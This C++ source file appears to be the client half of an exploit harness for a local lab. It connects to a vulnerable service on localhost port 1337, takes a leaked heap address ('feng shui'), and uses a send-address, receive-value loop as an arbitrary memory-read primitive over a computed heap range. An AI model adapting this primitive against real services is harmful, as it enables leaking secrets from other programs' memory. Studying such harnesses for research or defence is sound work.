#include <iostream>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <assert.h>
#include "exploit.h"

#define EXPLOIT_PORT 1337

// https://www.geeksforgeeks.org/socket-programming-cc/

using namespace std;

int sock;
uintptr_t feng_shui;

uint64_t read_vuln(uintptr_t addr) {
    //printf("Sending %16lX\n", addr);
    send(sock, &addr, sizeof(addr), 0);
    //printf("Sent\n");

    uint64_t value;
    int r = read(sock, &value, sizeof(value));
    assert(r == sizeof(value));
    //if (value != -1) printf("Received %16lX\n", value);
	
    return value;
}

int setup_exploit() {
    struct sockaddr_in serv_addr;
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        cerr << "Could not open socket" << endl;
        return -1;
    }

    serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(EXPLOIT_PORT);

    if (connect(sock, (struct sockaddr*) &serv_addr, sizeof(serv_addr))) {
        cerr << "Could not connect socket" << endl;
        return -1;
    }

    read(sock, &feng_shui, sizeof(feng_shui));
    printf("Feng shui: %16lX\n", feng_shui);
    return 0;
}

uintptr_t exploit_startaddr() {
	uintptr_t starting_addr = feng_shui - HEAP_SIZE;
	return starting_addr;
}

uintptr_t exploit_endaddr() {
	uintptr_t ending_addr = feng_shui + HEAP_SIZE;
	return ending_addr;
}
